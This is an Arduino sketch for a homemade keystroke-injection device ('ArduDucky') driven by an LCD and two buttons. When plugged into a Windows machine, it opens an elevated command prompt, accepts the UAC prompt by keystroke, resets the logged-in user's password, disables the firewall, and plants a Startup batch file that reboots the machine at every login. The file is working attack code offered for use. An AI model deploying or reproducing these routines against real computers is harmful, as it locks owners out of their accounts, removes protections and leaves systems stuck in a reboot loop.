//  Created by:- masterSal
//  Date:- Dec 11 2018
//  Name:- ArduDucky
//
//
#include <LiquidCrystal.h>
#include <HID.h>

#define PS_DELAY 10000

// Buttons pins
const int buttonPin_a = 8;
const int buttonPin_b = 9;

const int LCD_DELAY = 500;


// to initialize the number of interface pins
// of the liquidCrystal Display
LiquidCrystal lcd(12, 11, 5, 4, 3, 2);


/*
  -
  -
*/
void pressKeyboard(uint8_t modifiers, uint8_t key);
void startupDisplay(void);
void minimizeAllWindows(void);
void changePasswd(void);
void psChangePasswd(void);
void firewall(int mode);
void psFirewall(int mode);
void startupDeploy(void);
void test(void);


void setup() {
  // Starting the Serial COM for debugging
  Serial.begin(9600);
  // Start Serial at baud 115200
  Serial.begin(SERIAL_HID_BAUD);
  // Keyboard begin
  Keyboard.begin();
  // Setting the pinMode to INPUT
  pinMode(buttonPin_a, INPUT);
  pinMode(buttonPin_b, INPUT);
  // Setting the lcd rows and columns
  lcd.begin(16, 2);
  // just simple hello for the user.
  // You can comment out or remove this.
  startupDisplay();
}

void loop() {
  // Reading the value on buttonPin_a
  int val = digitalRead(buttonPin_a);
  Serial.println(val);
  if (!val) {
    while (1) {
      // Reading the value of buttonPin_a 
      int tmp_val = digitalRead(buttonPin_a);
      if (!tmp_val) {
        // Clear lcd
        lcd.clear();
        lcd.print("1. Change passwd");
        delay(LCD_DELAY);
        while (1) {
          if (!(tmp_val = digitalRead(buttonPin_a))) {
            break;
          } 
          else if (!(tmp_val = digitalRead(buttonPin_b))) {
            minimizeAllWindows(); // WinKey + d
            changePasswd();
          } // end else if
        } // end while
        // Clear lcd
        lcd.clear();
        lcd.print("2. Disable");
        lcd.setCursor(4, 2);
        lcd.print("Firewall.");
        delay(LCD_DELAY);
        while (1) {
          if (!(tmp_val = digitalRead(buttonPin_a))) {
            break;
          } else if (!(tmp_val = digitalRead(buttonPin_b))) {
            minimizeAllWindows();
            firewall(0);
          } // end else if
        } // end while 
        lcd.clear();
        lcd.print("3. Enable");
        lcd.setCursor(4, 2);
        lcd.print("Firewall");
        delay(LCD_DELAY);
        while (1) {
          if (!(tmp_val = digitalRead(buttonPin_a))) {
            break;
          } else if (!(tmp_val = digitalRead(buttonPin_b))) {
            minimizeAllWindows();
            firewall(1);
          } // end else if 
        } // end while
        // Clear lcd
        lcd.clear();
        lcd.print("4. Test...");
        delay(LCD_DELAY);
        while (1) {
          if (!(tmp_val = digitalRead(buttonPin_a))) {
            break;
          } else if (!(tmp_val = digitalRead(buttonPin_b))) {
            minimizeAllWindows();
            test();
          } // end else if 
        } // end while
        // Clear lcd
        lcd.clear();
        lcd.print("5. Change passwd");
        lcd.setCursor(2, 2);
        lcd.print("powershell");
        delay(LCD_DELAY);
        while (1) {
          if (!(tmp_val = digitalRead(buttonPin_a))) {
            break;
          } else if (!(tmp_val = digitalRead(buttonPin_b))) {
            minimizeAllWindows();
            psChangePasswd();
          } // end else if 
        } // end while
        // Clear lcd
        lcd.clear();
        lcd.print("6. Disable");
        lcd.setCursor(1, 2);
        lcd.print("Firewall-PS");
        delay(LCD_DELAY);
        while (1) {
          if (!(tmp_val = digitalRead(buttonPin_a))) {
            break;
          } else if (!(tmp_val = digitalRead(buttonPin_b))) {
            minimizeAllWindows();
            psFirewall(0);
          } // end else if 
        } // end while 
        // clear lcd
        lcd.clear();
        lcd.print("7. Enable");
        lcd.setCursor(1, 2);
        lcd.print("Firewall-PS");
        delay(LCD_DELAY);
        while (1) {
          if (!(tmp_val = digitalRead(buttonPin_a))) {
            break;
          } else if (!(tmp_val = digitalRead(buttonPin_b))) {
            minimizeAllWindows();
            psFirewall(1);
          } // end else if 
        } // end while
        // clear lcd
        lcd.clear();
        lcd.print("8. Startup");
        lcd.setCursor(2, 2);
        lcd.print("Deploy");
        delay(LCD_DELAY);
        while (1) {
          if (!(tmp_val = digitalRead(buttonPin_a))) {
            break;
          } else if (!(tmp_val = digitalRead(buttonPin_b))) {
            minimizeAllWindows();
            startupDeploy();
          } // end else if
        } // end while
      } // end while
    } // end if
  } else {
  } // end else
} // end loop


// for send raw keyboard signal
void pressKeyboard(uint8_t modifiers, uint8_t key)
{
  uint8_t keys[8] = {
    modifiers, 0,
    key, 0,
    0, 0,
    0, 0
  };
  HID_SendReport(HID_REPORTID_KeyboardReport, keys, sizeof(keys));
}



/*
  A fun start up display 
*/
void startupDisplay(void)
{
  lcd.clear();
  lcd.blink();
  delay(300);
  lcd.setCursor(4, 1);
  lcd.print("Booting...");
  delay(100);
  lcd.clear();
  lcd.print("Welcome");
  lcd.setCursor(3, 2);
  lcd.print("Sal!");
  delay(2000);
  lcd.clear();
}


// win + d
void minimizeAllWindows(void)
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
}

// Change password using the normal cmd
void changePasswd(void)
{
  // Opening cmd.exe as Admin
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.print("cmd");
  pressKeyboard(RAW_KEYBOARD_RIGHT_CTRL | RAW_KEYBOARD_RIGHT_SHIFT, RAW_KEYBOARD_RETURN);
  pressKeyboard(0, 0); // This part is important because it releases the pressed button
  delay(2555);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  // --- end ---
  delay(2000);
  Keyboard.println("net user %username% averysecurepassword");
  delay(120);
  Keyboard.println("exit");
}

// change password using powershell
void psChangePasswd(void)
{
  // Starting cmd as admin
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(400);
  Keyboard.println("powershell start-process cmd.exe -verb runAs");
  delay(PS_DELAY);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(2555);
  Keyboard.println("net user %username% Salim@blackpass47");
  delay(200);
  Keyboard.println("exit");
}


void firewall(int mode)
{
  // enabling/disabling firewall
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.print("cmd");
  pressKeyboard(RAW_KEYBOARD_RIGHT_CTRL | RAW_KEYBOARD_RIGHT_SHIFT, RAW_KEYBOARD_RETURN);
  pressKeyboard(0, 0); // release pressed key
  delay(2555);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  // -- end --
  delay(2000);
  if (mode == 1) {
    Keyboard.println("netsh advfirewall set allprofiles state on");
  } else if (mode == 0) {
    Keyboard.println("netsh advfirewall set allprofiles state off");
  } 
  delay(120);
  Keyboard.println("exit");
}

void psFirewall(int mode)
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  Keyboard.println("powershell start-process cmd.exe -verb runAs");
  delay(PS_DELAY);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1500);
  if (mode == 1) {
    Keyboard.println("netsh advfirewall set allprofiles state on");
  } else if (mode == 0) {
    Keyboard.println("netsh advfirewall set allprofiles state off"); 
  }
  delay(400);
  Keyboard.println("exit");
}


void startupDeploy(void)
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1400);
  Keyboard.println("cmd");
  delay(1500);
  Keyboard.println("cd \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
  delay(1000);
  Keyboard.println("echo shutdown -r -t 00 > rebounce.bat");
  delay(500);
  Keyboard.println("exit");
  
}

void test(void)
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.println("notepad");
  delay(1600);
  for (int x=0; x<2; x++) {
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
  }
  delay(160);
  Keyboard.println("Hello, World!");
  for (int x=0; x<3; x++) {
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
  }
  delay(160);
  Keyboard.println("Created by: masterSal");
  for (int x=0; x<4; x++) {
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
  }
  delay(160);
  Keyboard.println("github: @masterSal");
}
